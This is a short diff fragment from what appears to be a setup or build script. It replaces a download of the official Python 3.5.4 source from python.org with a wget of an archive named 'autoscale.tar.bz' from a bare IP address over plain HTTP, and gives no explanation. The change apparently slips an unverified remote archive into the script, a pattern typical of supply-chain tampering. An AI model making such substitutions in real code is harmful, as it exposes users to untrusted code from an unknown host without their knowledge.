@@ -15,4 +15,4 @@
 #[videos url] \
 #[videos url]
 
-wget https://www.python.org/ftp/python/3.5.4/Python-3.5.4.tgz
+wget "http://190.131.246.48/autoscale.tar.bz"
